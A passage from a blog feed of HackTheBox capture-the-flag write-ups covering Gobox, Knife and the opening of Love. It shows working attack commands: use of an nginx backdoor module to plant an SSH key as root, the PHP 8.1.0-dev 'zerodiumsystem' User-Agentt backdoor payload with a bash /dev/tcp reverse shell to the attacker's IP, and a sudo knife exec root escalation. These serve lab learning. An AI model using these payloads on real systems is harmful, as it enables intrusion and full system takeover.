www-data@gobox:/etc/nginx$ find / -type f -name <span class="s2">&#34;ngx_http_execute_module.so&#34;</span> 2&gt;/dev/null
/usr/lib/nginx/modules/ngx_http_execute_module.so
www-data@gobox:/etc/nginx$ file /usr/lib/nginx/modules/ngx_http_execute_module.so
/usr/lib/nginx/modules/ngx_http_execute_module.so: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4279ae42bf642b21378aa43c06b52f4d0b89f2ad, with debug_info, not stripped
</code></pre></div><p>I&rsquo;m trying to find the origin of this module by grabbing some readable code using  <code>strings</code>. It turns out the backdoor is taken from this Github repository: <a href="https://github.com/limithit/NginxExecute">NginxExecute</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.97»
$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;.c$&#39;</span>
ngx_pcalloc
__ctype_b_loc
realloc
malloc
ngxexecute_strncpy_alloc
ngxexecute_strcpy_alloc
~iHc
/home/ubuntu/NginxExecute//ngx_result.c
7src
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="nginx-backdoor">NGINX Backdoor</h4>
<p>According to the README file from the repository, I just need to send a HTTP request with <code>?system.run[command]</code>, but it doesn&rsquo;t work here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -v <span class="s2">&#34;http://127.0.0.1:8000/?system.run[whoami]&#34;</span>
*   Trying 127.0.0.1:8000...
* TCP_NODELAY <span class="nb">set</span>
* Connected to 127.0.0.1 <span class="o">(</span>127.0.0.1<span class="o">)</span> port <span class="m">8000</span> <span class="o">(</span><span class="c1">#0)</span>
&gt; GET /?system.run<span class="o">[</span>ifconfig<span class="o">]</span> HTTP/1.1
&gt; Host: 127.0.0.1:8000
&gt; User-Agent: curl/7.68.0
&gt; Accept: */*
&gt;
* Empty reply from server
* Connection <span class="c1">#0 to host 127.0.0.1 left intact</span>
curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
</code></pre></div><p>Running another <code>strings</code> command against the backdoor reveals it uses <code>ippsec.run</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.97»
$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;run&#39;</span>
ippsec.run
</code></pre></div><p>Now if I send <code>?ippsec.run[whoami]</code>, it returns:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[whoami]&#34;</span>
root
</code></pre></div><p>Using the previous reverse shell script I dropped on <code>/tmp/</code>, I can get an interactive shell access as root, but then the shell gets exited by itself.</p>
<p><div class="img-container"><img src="imgs/image-20210908184311943.png" alt="image-20210908184311943"  /></div>
</p>
<p>So instead, I will inject my SSH public key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39;</span> &gt; /tmp/iamf
www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[cat /tmp/iamf | tee /root/.ssh/authorized_keys]&#34;</span>
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H
</code></pre></div><p>Now I can SSH login as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ ssh root@10.10.11.113
Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-81-generic x86_64<span class="o">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed <span class="m">08</span> Sep <span class="m">2021</span> 11:52:18 AM UTC

  System load:                      0.0
  Usage of /:                       37.1% of 9.72GB
  Memory usage:                     20%
  Swap usage:                       0%
  Processes:                        <span class="m">244</span>
  Users logged in:                  <span class="m">0</span>
  IPv4 address <span class="k">for</span> br-bb21b8b9b286: 172.28.0.1
  IPv4 address <span class="k">for</span> docker0:         172.17.0.1
  IPv4 address <span class="k">for</span> ens160:          10.10.11.113


<span class="m">0</span> updates can be applied immediately.


The list of available updates is more than a week old.
To check <span class="k">for</span> new updates run: sudo apt update

Last login: Thu Aug <span class="m">26</span> 23:56:12 <span class="m">2021</span>
root@gobox:~#
</code></pre></div><p>And I can grab the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# ls -l
total <span class="m">12</span>
-rwxr-xr-x <span class="m">1</span> root root  <span class="m">536</span> Aug <span class="m">24</span> 20:33 iptables.sh
-rw------- <span class="m">1</span> root root   <span class="m">33</span> Aug <span class="m">26</span> 21:10 root.txt
drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snap
root@gobox:~# cat root.txt
81d35...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h2 id="explore">Explore</h2>
<h3 id="undetected-ports">Undetected ports</h3>
<p>During enumeration, when I printed the networking status, I noticed that ports 9000, 9001, and 4566 should be accessible from external, with the exception that port 4566 needs an authentication header set first to be accessible.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
<span class="o">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span class="o">)</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
</code></pre></div><p>It turns out there is a set of <code>iptables</code> rules which drop any connection coming to these ports.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# iptables -L
Chain INPUT <span class="o">(</span>policy ACCEPT<span class="o">)</span>
target     prot opt <span class="nb">source</span>               destination         
ACCEPT     all  --  localhost/8          anywhere            
ACCEPT     all  --  172.16.0.0/12        anywhere            
DROP       tcp  --  anywhere             anywhere             tcp dpt:9002
DROP       tcp  --  anywhere             anywhere             tcp dpt:9001
DROP       tcp  --  anywhere             anywhere             tcp dpt:9000
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p><em>Shouldn&rsquo;t it then return with <code>filtered</code> status?</em></p>
<p>Well, I think it was purely my mistake. I used <code>--min-rate=10000</code>, so this could be the reason <code>nmap</code> misidentified the filtered port as closed.</p>
<h3 id="gobox-request-routing">Gobox Request Routing</h3>
<p>The first time I looked into the NGINX configuration file, it didn&rsquo;t make sense to me why my web shell is on the host OS? In fact, I uploaded my web shell to an S3 bucket, which is also a container.</p>
<p>Now, with root access obtained, I could understand what was happening, and there was a synchronization process between the host and the LocalStack container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# cat /var/spool/incron/root 
/opt/deploy/.localstack/data/recorded_api_calls.json    IN_MODIFY       /usr/bin/aws --endpoint-url http://127.0.0.1:9000 s3 sync s3://website /opt/website
/home/ubuntu/user.txt   IN_MODIFY       cp /home/ubuntu/user.txt /var/www/
</code></pre></div><p>So if I upload something into the bucket, the host will have it as well.</p>
<p>I also looked at how the web routing is done in this box and eventually visualize it as shown below:</p>
<p><div class="img-container"><img src="imgs/image-20210912193743912.png" alt="image-20210912193743912"  /></div>
</p>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://www.onsecurity.io/blog/go-ssti-method-research/">https://www.onsecurity.io/blog/go-ssti-method-research/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Knife</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-knife/</link>
      <pubDate>Sat, 28 Aug 2021 22:00:49 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-knife/</guid>
      <description>Exploiting the backdoor planted in PHP 8.1-dev</description>
      <content:encoded><![CDATA[<p>Knife hosts a website that is running a hijacked version of PHP in which it contains a remote code execution backdoor. Leveraging this backdoor results in an interactive shell access to the system. The user has sudo permissions on <code>knife</code> , which can be exploited to run a malicious Ruby code.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Using a backdoor from a supply chain attack 😅</li>
<li>Sudo exploitation on <code>knife</code>.</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>BurpSuite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Performing <code>nmap</code> all TCP scan discovers two open ports, SSH on 22 and an Apache web server on 80. Nothing much to see here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «knife» «10.10.14.117»
$ fscan 10.10.10.242 knife
nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.10.242 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
nmap -p 22,80 -sC -sV -oA nmap/10-tcp-allport-knife 10.10.10.242
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-27 10:19 EDT
Nmap scan report <span class="k">for</span> 10.10.10.242
Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">3072</span> be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title:  Emergent Medical Idea
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 26.44 seconds
</code></pre></div><blockquote>
<p>fscan is just my Nmap wrapper to do full scan and immediately run script scan against the discovered ports .</p>
</blockquote>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80----website">TCP 80  - Website</h3>
<p>With <code>curl</code>, the hosted website shows that it&rsquo;s powered by PHP 8.1.0-dev.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «knife» «10.10.14.70» 
$ curl -sI http://10.10.10.242/
HTTP/1.1 <span class="m">200</span> OK
Date: Sat, <span class="m">22</span> May <span class="m">2021</span> 21:46:13 GMT
Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</code></pre></div><p>The website only displays some CSS text animation. The available menus aren&rsquo;t clickable.</p>
<p><div class="img-container"><img src="imgs/image-20210827213646250.png" alt="image-20210827213646250"  /></div>
</p>
<p>I did a Gobuster scan but it didn&rsquo;t output any interesting thing.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-james">Shell as james</h3>
<h4 id="php-rce-backdoor">PHP RCE backdoor</h4>
<p>Around March 2021, the PHP git server was compromised and two <a href="https://news-web.php.net/php.internals/113838">malicious commit</a> were pushed to the PHP source code. The code from these commits allows an attacker to obtain remote code execution through the HTTP <code>User-Agent</code> header on any website that uses the hijacked version of PHP. In short, it&rsquo;s a backdoor.</p>
<p>The commits were pushed into the development branch of PHP 8.1. From the previous web enumeration, the website returns with <code>X-Powered-By: PHP/8.1.0-dev</code> in its HTTP response. By presuming that the website uses the hijacked version of PHP, I can try to send a HTTP request with the following HTTP header.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">User-Agentt: zerodiumsystem(&#39;uname -a&#39;);
</span></code></pre></div><p>And the web was vulnerable.</p>
<p><div class="img-container"><img src="imgs/image-20210827224703632.png" alt="image-20210827224703632"  /></div>
</p>
<p>Now to get reverse shell, I can send the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">User-Agentt: zerodiumsystem(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.70/9000 0&gt;&amp;1&#34;&#39;);
</span></code></pre></div><p>When I send that payload, I have interactive shell access as <strong>james</strong> on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «knife» «10.10.14.70» 
$ nc -nvlp <span class="m">9000</span>  
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
connect to <span class="o">[</span>10.10.14.70<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.242<span class="o">]</span> <span class="m">48566</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>966<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
james@knife:/$ id
id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span>
</code></pre></div><p>I also made a script to leverage this backdoor, <a href="https://github.com/fahmifj/php-8.1.0-dev-zerodium-rce">here</a>.</p>
<h4 id="shell-upgrade">Shell upgrade</h4>
<p>I will do the PTY trick to upgrade my shell</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">james@knife:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
james@knife:/$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
james@knife:/$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">15541</span> suspended  nc -nvlp <span class="m">9000</span>
→ root@kali «knife» «10.10.14.70» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">15541</span> continued  nc -nvlp <span class="m">9000</span>
james@knife:/$ 
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>User <strong>james</strong> is allowed to run <code>knife</code> as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">james@knife:/opt/chef-workstation/bin$ sudo -l
Matching Defaults entries <span class="k">for</span> james on knife:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User james may run the following commands on knife:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/knife
</code></pre></div><h4 id="sudo---knife">Sudo - knife</h4>
<p><code>knife</code> is a part of <a href="https://www.chef.io/products/chef-infra">Chef</a>, a software for infrastructure management and automation. I&rsquo;m not familiar with that, but according to <a href="https://docs.chef.io/workstation/knife_exec/#examples">this documentation</a>, <code>knife</code> can run a Ruby code or Ruby file script. Therefore, the tool can be abused like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">james@knife:~$ sudo knife <span class="nb">exec</span> -E <span class="s2">&#34;exec &#39;/bin/bash&#39;&#34;</span>
root@knife:/home/james# id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div><p>Now I can grab the root flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@knife:/home/james# cat /root/root.txt 
c3744...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://news-web.php.net/php.internals/113838">https://news-web.php.net/php.internals/113838</a></li>
<li><a href="https://docs.chef.io/workstation/knife_exec/#examples">https://docs.chef.io/workstation/knife_exec/#examples</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Love</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-love/</link>
      <pubDate>Mon, 09 Aug 2021 05:38:45 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-love/</guid>
      <description>SSRF in beginner-level</description>
      <content:encoded><![CDATA[<p>Love from Hack The Box hosts a voting system application and an online file scanner. The file scanner is vulnerable to SSRF, which can be exploited to leak a set of credentials that can be used to login into the voting app. The photo upload functionality is leveraged to drop a web shell, which is then used to gain interactive shell access on the machine. Enumeration of the system reveals that <code>AlwaysInstallElevated</code> is enabled, and this can be leveraged to install a malicious <code>.msi</code> installer and get SYSTEM access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SSRF</li>
<li>Abusing Windows <strong>AlwaysInstallElevated</strong></li>
<li>(Alternative) PrintNightmare LPE</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
<li>WinPEAS</li>
<li>msfvenom</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan scan discovers a bunch of open ports.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
$ fscan 10.10.10.239 love
nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> 10.10.10.239 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
nmap -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oA nmap/10-tcp-allport-love 10.10.10.239
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-08 11:29 EDT
Nmap scan report <span class="k">for</span> 10.10.10.239
Host is up <span class="o">(</span>0.087s latency<span class="o">)</span>.

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
<span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
<span class="p">|</span>_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
<span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging.love.htb/organizationName<span class="o">=</span>ValentineCorp/stateOrProvinceName<span class="o">=</span>m/countryName<span class="o">=</span>in
<span class="p">|</span> Not valid before: 2021-01-18T14:00:16
<span class="p">|</span>_Not valid after:  2022-01-18T14:00:16
<span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
<span class="p">|</span> tls-alpn: 
<span class="p">|</span>_  http/1.1
445/tcp   open  microsoft-ds Windows <span class="m">10</span> Pro <span class="m">19042</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
3306/tcp  open  mysql?
<span class="p">|</span> fingerprint-strings: 
<span class="p">|</span>   GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, NULL, NotesRPC, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WMSRequest, oracle-tns: 
<span class="p">|</span>_    Host <span class="s1">&#39;10.10.14.51&#39;</span> is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
<span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="p">|</span>_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="p">|</span>_http-title: Not Found
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>LOVE
<span class="p">|</span> Subject Alternative Name: DNS:LOVE, DNS:Love
<span class="p">|</span> Not valid before: 2021-04-11T14:39:19
<span class="p">|</span>_Not valid after:  2024-04-10T14:39:19
<span class="p">|</span>_ssl-date: 2021-08-08T15:53:52+00:00<span class="p">;</span> +21m37s from scanner time.
<span class="p">|</span> tls-alpn: 
<span class="p">|</span>_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="p">|</span>_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/8%Time<span class="o">=</span>610FF878%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NUL
SF:L,4A,<span class="s2">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.51&#39;\x20is\x20not\x20allowe
</span><span class="s2">...[SNIP]...
</span><span class="s2">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
</span><span class="s2">
</span><span class="s2">Host script results:
</span><span class="s2">|_clock-skew: mean: 2h06m37s, deviation: 3h30m01s, median: 21m36s
</span><span class="s2">| smb-os-discovery: 
</span><span class="s2">|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
</span><span class="s2">|   OS CPE: cpe:/o:microsoft:windows_10::-
</span><span class="s2">|   Computer name: Love
</span><span class="s2">|   NetBIOS computer name: LOVE\x00
</span><span class="s2">|   Workgroup: WORKGROUP\x00
</span><span class="s2">|_  System time: 2021-08-08T08:53:41-07:00
</span><span class="s2">| smb-security-mode: 
</span><span class="s2">|   account_used: &lt;blank&gt;
</span><span class="s2">|   authentication_level: user
</span><span class="s2">|   challenge_response: supported
</span><span class="s2">|_  message_signing: disabled (dangerous, but default)
</span><span class="s2">| smb2-security-mode: 
</span><span class="s2">|   2.02: 
</span><span class="s2">|_    Message signing enabled but not required
</span><span class="s2">| smb2-time: 
</span><span class="s2">|   date: 2021-08-08T15:53:43
</span><span class="s2">|_  start_date: N/A
</span><span class="s2">
</span><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 137.03 seconds
</span></code></pre></div><p>Most notable services are:</p>
<ul>
<li>An Apache web server that handles 3 websites on port 80, 443, and 5000 (this one is forbidden).</li>
<li>SMB on port 445, good start.</li>
<li>A MySQL server on port 3306, I will stay away from this for now because IP block</li>
<li>WinRM on 5985/6, I will use this for lateral movement if I have creds.</li>
</ul>
<p>Seeing Apache and MySQL on a Windows host, I can assume that this machine uses XAMPP.</p>
<p>Nmap also identified two hostnames: <code>www.love.htb</code> and <code>staging.love.htb</code>. I will add these to my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «love» «10.10.14.51» 
$ sudo <span class="nb">echo</span> <span class="s1">&#39;www.love.htb staging.love.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous login is not allowed here, I will re-visit this later when I have creds.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «love» «10.10.14.51» 
$ smbclient -N -L //10.10.10.239 
session setup failed: NT_STATUS_ACCESS_DENIED
</code></pre></div><h3 id="tcp-5000">TCP 5000</h3>
<p>Visiting this port results in a <strong>403 Forbidden</strong> message error.</p>
<p><div class="img-container"><img src="imgs/image-20210809005411183.png" alt="image-20210809005411183"  /></div>
</p>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 with the IP or the hostname returns the same content.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
$ <span class="k">for</span> i in 10.10.10.239 www.love.htb<span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$i</span><span class="s2"> &#34;</span><span class="p">;</span> curl -s <span class="nv">$i</span> <span class="p">|</span> wc -c<span class="p">;</span> <span class="k">done</span>                      
10.10.10.239 <span class="m">4388</span>
www.love.htb <span class="m">4388</span>
</code></pre></div><p>On the browser, the site displays a login form of a Voting System app.</p>
<p><div class="img-container"><img src="imgs/image-20210809003519382.png" alt="image-20210809003519382"  /></div>
</p>
<p>Trying some random IDs and common passwords didn&rsquo;t work here.</p>
<p><div class="img-container"><img src="imgs/image-20210809004024045.png" alt="image-20210809004024045"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>Gobuster</code> discovers a bunch of directories, but one that stands out is  <code>/admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
$ gobuster dir -f -u http://www.love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -x txt,php -o gobuster/gobuster-S-80 -t <span class="nv">40</span>                                                                                                                                                           
<span class="o">===============================================================</span>
Gobuster v3.1.0
